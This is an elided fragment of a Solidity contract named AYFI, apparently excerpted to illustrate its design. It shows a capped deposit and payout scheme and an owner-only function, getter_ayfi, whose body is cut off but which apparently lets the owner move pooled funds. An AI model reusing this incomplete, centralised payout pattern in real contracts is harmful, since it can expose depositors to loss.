...
contract AYFI is AYFITOKEN {
    ...
    event Beginning(address indexed addr);
   ...
   function() payable external {}
    ...
    function _deposit(address _addr, uint256 _amount) private {
        ...
        if(users[_addr].deposit_time > 0) {
            ...
            require(users[_addr].payouts >= this.maxPayoutOf(_addr, users[_addr].deposit_amount), "Deposit already exists");
    ...
    function maxPayoutOf(address _addr, uint256 _amount) view external returns(uint256) {
        uint256 _per;
        if(users[_addr].dire_status == 1) {
    ...
    function getter_ayfi( uint _amount) external {
        require(msg.sender == owner,'Permission denied');
        if (_amount > 0) {
